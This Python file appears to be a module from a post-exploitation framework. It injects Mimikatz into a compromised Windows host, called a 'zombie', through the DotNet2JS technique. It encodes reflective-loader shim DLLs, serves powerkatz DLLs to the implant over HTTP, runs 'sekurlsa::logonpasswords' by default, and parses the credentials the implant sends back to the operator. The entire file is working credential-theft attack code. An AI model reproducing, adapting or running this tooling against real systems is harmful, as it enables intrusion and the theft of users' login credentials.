import core.implant
import core.job
import core.cred_parser
import string

class DotNet2JSJob(core.job.Job):
    def create(self):
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
        self.fork32Bit = True
        arch = self.options.get("ARCH")
        self.mimi_output = ""
        if self.session_id == -1:
            if arch == 'auto':
                self.options.set("ONESHOTAUTO", "true")
                self.options.set("SHIMB64", "false")
                self.options.set("SHIMOFFSET", "false")
            else:
                self.options.set("ONESHOTAUTO", "false")
                if arch == '64':
                    self.options.set("SHIMB64", self.options.get("SHIMX64B64"))
                    self.options.set("SHIMOFFSET", self.options.get("SHIMX64OFFSET"))
                elif arch == '32':
                    self.options.set("SHIMB64", self.options.get("SHIMX86B64"))
                    self.options.set("SHIMOFFSET", self.options.get("SHIMX86OFFSET"))
                self.options.set("SHIMX64B64", "false")
                self.options.set("SHIMX86B64", "false")
                self.options.set("SHIMX64OFFSET", "false")
                self.options.set("SHIMX86OFFSET", "false")
            self.errstat = 0
            return
        if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
            self.error("0", "This job requires an elevated session. Set IGNOREADMIN to true to run anyway.", "Not elevated", "")
            return False

        self.options.set("ONESHOTAUTO", "false")

        # cant change this earlier, has to be job specific
        # i dont like it, but this is how we do this to make payload smaller
        if arch == 'auto':
            self.options.set("SHIMB64", self.options.get("SHIMX86B64"))
            self.options.set("SHIMOFFSET", self.options.get("SHIMX86OFFSET"))
        elif arch == '64':
            self.options.set("SHIMB64", self.options.get("SHIMX64B64"))
            self.options.set("SHIMOFFSET", self.options.get("SHIMX64OFFSET"))
        elif arch == '32':
            self.options.set("SHIMB64", self.options.get("SHIMX86B64"))
            self.options.set("SHIMOFFSET", self.options.get("SHIMX86OFFSET"))
        self.options.set("SHIMX64B64", "false")
        self.options.set("SHIMX86B64", "false")
        self.options.set("SHIMX64OFFSET", "false")
        self.options.set("SHIMX86OFFSET", "false")
        self.errstat = 0

    def parse_mimikatz(self, data):
        cp = core.cred_parser.CredParse(self)
        self.mimi_output = cp.parse_mimikatz(data)

    def report(self, handler, data, sanitize = False):
        data = data.decode('latin-1')
        import binascii
        try:
            data = binascii.unhexlify(data)
            data = data.decode('utf-16-le')
        except:
            pass

        task = handler.get_header(self.options.get("UUIDHEADER"), False)

        if task == self.options.get("SHIMX64UUID"):
            handler.send_file(self.options.get("SHIMX64DLL"))

        if task == self.options.get("MIMIX64UUID"):
            handler.send_file(self.options.get("MIMIX64DLL"))

        if task == self.options.get("MIMIX86UUID"):
            handler.send_file(self.options.get("MIMIX86DLL"))

        if len(data) == 0:
            handler.reply(200)
            return

        if "mimikatz(powershell) # " in data:
            self.parse_mimikatz(data)
            handler.reply(200)
            return

        if data == "Complete" and self.errstat != 1:
            super(DotNet2JSJob, self).report(handler, data)

        #self.print_good(data)

        handler.reply(200)

    def done(self):
        self.results = self.mimi_output if self.mimi_output else ""
        self.display()

    def display(self):
        if self.mimi_output:
            self.print_good(self.mimi_output)
        else:
            self.print_error()
        #self.shell.print_plain(str(self.errno))

class DotNet2JSImplant(core.implant.Implant):

    NAME = "Shellcode via DotNet2JS"
    DESCRIPTION = "Executes arbitrary shellcode using the DotNet2JS technique"
    AUTHORS = ["zerosum0x0", "Aleph-Naught-" "gentilwiki", "tiraniddo"]
    STATE = "implant/inject/mimikatz_dotnet2js"

    def load(self):
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)

        self.options.register("MIMICMD", "sekurlsa::logonpasswords", "What Mimikatz command to run?", required=True)

        self.options.register("ARCH", "auto", "Architecture of the target computer (auto, 64, 32)", advanced=True, enum=['auto', '64', '32'])

        self.options.register("SHIMX86DLL", "data/bin/mimishim.dll", "relative path to mimishim.dll", required=True, advanced=True)
        self.options.register("SHIMX64DLL", "data/bin/mimishim.x64.dll", "relative path to mimishim.x64.dll", required=True, advanced=True)
        self.options.register("MIMIX86DLL", "data/bin/powerkatz32.dll", "relative path to powerkatz32.dll", required=True, advanced=True)
        self.options.register("MIMIX64DLL", "data/bin/powerkatz64.dll", "relative path to powerkatz64.dll", required=True, advanced=True)

        self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID", advanced=True)

        import uuid
        self.options.register("SHIMX64UUID", uuid.uuid4().hex, "UUID", hidden=True)
        self.options.register("MIMIX64UUID", uuid.uuid4().hex, "UUID", hidden=True)
        self.options.register("MIMIX86UUID", uuid.uuid4().hex, "UUID", hidden=True)

        self.options.register("SHIMX86B64", self.dllb64(self.options.get("SHIMX86DLL")), "calculated bytes for arr_DLL", hidden=True)
        self.options.register("SHIMX64B64", self.dllb64(self.options.get("SHIMX64DLL")), "calculated bytes for arr_DLL", hidden=True)

        self.options.register("SHIMX86OFFSET", "6202", "Offset to the reflective loader", advanced = True)
        self.options.register("SHIMX64OFFSET", "7620", "Offset to the reflective loader", advanced = True)

        self.options.register("ONESHOTAUTO", "", "", hidden = True)
        self.options.register("SHIMB64", "", "", hidden = True)
        self.options.register("SHIMOFFSET", "", "", hidden = True)

        # self.options.register("SHIMB64", "", "calculated bytes for arr_DLL", advanced = True)
        # self.options.register("SHIMOFFSET", "", "Offset to the reflective loader", advanced = True)

    def job(self):
        return DotNet2JSJob

    def dllb64(self, path):
        import base64
        with open(path, 'rb') as fileobj:
            text =  base64.b64encode(fileobj.read()).decode()
            index = 0
            ret = '"';
            for c in text:
                ret += str(c)
                index += 1
                if index % 150 == 0:
                    ret += '"+\r\n"'

            ret += '"'
            return ret

    def run(self):
        workloads = {}
        workloads["js"] = "data/implant/inject/mimikatz_dotnet2js.js"

        self.dispatch(workloads, self.job)
